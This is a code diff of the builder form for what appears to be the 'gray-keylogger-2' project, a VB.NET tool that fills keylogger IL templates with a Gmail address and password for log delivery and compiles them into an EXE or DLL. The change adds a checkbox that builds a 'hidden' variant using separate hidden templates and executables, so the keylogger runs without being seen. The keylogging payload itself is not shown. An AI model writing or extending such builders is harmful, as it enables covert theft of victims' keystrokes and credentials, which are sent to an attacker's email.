@@ -69,7 +69,11 @@ Public Class Form1
                 If RadioButton4.Checked Then
                     gs = Replace(My.Computer.FileSystem.ReadAllText("Library.il"), "[logsize]", Logsize)
                 ElseIf RadioButton3.Checked Then
-                    gs = Replace(My.Computer.FileSystem.ReadAllText("Executable.il"), "[logsize]", Logsize)
+                    If CheckBox3.Checked Then
+                        gs = Replace(My.Computer.FileSystem.ReadAllText("Executable_hidden.il"), "[logsize]", Logsize)
+                    Else
+                        gs = Replace(My.Computer.FileSystem.ReadAllText("Executable.il"), "[logsize]", Logsize)
+                    End If
                 End If
                 Dim hs = Replace(gs, "[email]", TextBox2.Text & "@gmail.com")
                 Dim js = Replace(hs, "[password]", TextBox4.Text)
@@ -84,12 +88,17 @@ Public Class Form1
                 My.Computer.FileSystem.WriteAllText("temp.il", ss, False)
                 If RadioButton4.Checked Then
                     If FolderBrowserDialog1.ShowDialog = DialogResult.OK Then
-                        My.Computer.FileSystem.CopyFile("Executer.exe", FolderBrowserDialog1.SelectedPath & "\Executer.exe", Microsoft.VisualBasic.FileIO.UIOption.AllDialogs, Microsoft.VisualBasic.FileIO.UICancelOption.DoNothing)
-                        My.Computer.FileSystem.WriteAllText("temp.bat", "@echo off" & vbNewLine & "ilasm.exe" & " temp.il /DLL /NOLOGO /FOLD /OPTIMIZE /OUTPUT=""" & FolderBrowserDialog1.SelectedPath & "\Library.dll" & """" & vbNewLine & "pause", False)
-                        Process.Start("temp.bat").WaitForExit()
+                        If CheckBox3.Checked Then
+                            My.Computer.FileSystem.CopyFile("Executer_hidden.exe", FolderBrowserDialog1.SelectedPath & "\Executer_hidden.exe", Microsoft.VisualBasic.FileIO.UIOption.AllDialogs, Microsoft.VisualBasic.FileIO.UICancelOption.DoNothing)
+                            My.Computer.FileSystem.WriteAllText("temp.bat", "@echo off" & vbNewLine & "ilasm.exe" & " temp.il /DLL /NOLOGO /FOLD /OPTIMIZE /OUTPUT=""" & FolderBrowserDialog1.SelectedPath & "\Library.dll" & """" & vbNewLine & "pause", False)
+                            Process.Start("temp.bat").WaitForExit()
+                        Else
+                            My.Computer.FileSystem.CopyFile("Executer.exe", FolderBrowserDialog1.SelectedPath & "\Executer.exe", Microsoft.VisualBasic.FileIO.UIOption.AllDialogs, Microsoft.VisualBasic.FileIO.UICancelOption.DoNothing)
+                            My.Computer.FileSystem.WriteAllText("temp.bat", "@echo off" & vbNewLine & "ilasm.exe" & " temp.il /DLL /NOLOGO /FOLD /OPTIMIZE /OUTPUT=""" & FolderBrowserDialog1.SelectedPath & "\Library.dll" & """" & vbNewLine & "pause", False)
+                            Process.Start("temp.bat").WaitForExit()
+                        End If
                     End If
                 ElseIf RadioButton3.Checked Then
-                    ''EXE
                     SaveFileDialog1.InitialDirectory = "Desktop"
                     SaveFileDialog1.Filter = "Executable Files|*.exe"
                     If SaveFileDialog1.ShowDialog = Windows.Forms.DialogResult.OK Then
@@ -110,7 +119,6 @@ Public Class Form1
             MessageBox.Show(ex.Message)
         End Try
     End Sub
-
     Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
         Process.Start("https://github.com/graysuit/gray-keylogger-2")
     End Sub
